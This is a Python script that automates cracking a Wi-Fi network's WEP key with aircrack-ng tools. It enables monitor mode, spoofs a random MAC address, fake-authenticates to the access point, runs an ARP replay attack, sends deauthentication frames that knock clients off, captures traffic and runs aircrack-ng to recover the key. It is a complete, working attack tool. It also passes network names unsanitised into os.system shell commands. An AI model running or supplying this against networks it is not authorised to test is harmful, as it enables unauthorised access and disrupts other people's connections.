#!/usr/bin/python

import monitor_management
import os
import subprocess
import time
from signal import SIGINT
import random
from database import *
import socket
import shutil

def test_injection(interface, BSSID, ESSID):
	command= "sudo aireplay-ng -9 -e "
	command+=ESSID
	command+=" -a "
	command+=BSSID
	command+=" "
	command+=interface
	returncode=os.system (command)
	if returncode !=0:
		raise Exception ("injection test failed")

def start_airodump(interface, channel, BSSID):
	os.makedirs("/home/isis/output")
	command= ['sudo', "airodump-ng", "-c"]
	command.append(str (channel))
	command.append("--bssid")
	command.append(BSSID)
	command.append("-w")
	command.append("/home/isis/output/output")
	command.append(interface)

	DN = open(os.devnull, 'w')
	proc_airodump= subprocess.Popen(command, stdout=DN, stderr=DN)
	return proc_airodump

def fake_authentication(interface, ESSID, BSSID, MAC):
	command="sudo aireplay-ng -1 0 -e "
	command+=ESSID
	command+=" -h "
	command+=MAC
	command+=" "
	command+=interface
	print (command)
	os.system(command)


def killprocesses(process_list):
	for process in process_list:
		os.kill(process.pid, SIGINT)

def randomMAC():
	mac = [ 0x00, 0x16, 0x3e,
		random.randint(0x00, 0x7f),
		random.randint(0x00, 0xff),
		random.randint(0x00, 0xff) ]
	return ':'.join(map(lambda x: "%02x" % x, mac))

def start_aireplay(interface, BSSID, MAC):
	command=["sudo", "aireplay-ng", "-3", "-b"]
	command.append(BSSID)
	command.append("-h")
	command.append(MAC)
	command.append(interface)
	DN = open(os.devnull, 'w')
	proc_aireplay=subprocess.Popen(command,stdout=DN, stderr=DN)
	return proc_aireplay

def deauth(interface,BSSID):
	command=["sudo", "aireplay-ng", "-0", "5", "-a"]
	command.append(BSSID)
	command.append(interface)
	DN = open(os.devnull, 'w')
	subprocess.Popen(command,stdout=DN, stderr=DN)

def crack(BSSID):
	command= ["sudo", "aircrack-ng", "-b"]
	command.append (BSSID)
	command.append ("-l")
	command.append ("/home/isis/key")
	time.sleep(10)
	command.append("/home/isis/output/output-01.cap")
	proc_aircrack=subprocess.Popen(command)
	return proc_aircrack

def cleanup():
	shutil.rmtree("/home/isis/output")


def automated_crack(ESSID, BSSID, channel):
	interface=monitor_management.start_monitor("wlan0", channel)
	print ("monitor interface started")
	test_injection(interface, BSSID, ESSID)
	process_list= [start_airodump(interface, channel, BSSID)]
	MAC= randomMAC()
	fake_authentication(interface, ESSID, BSSID, MAC)
	process_list.append(start_aireplay(interface, BSSID, MAC))
	deauth (interface, BSSID)
	time.sleep(10)
	proc_crack=crack(BSSID)
	proc_crack.wait()
	killprocesses(process_list)
	monitor_management.stop_monitor(interface)
	cleanup()
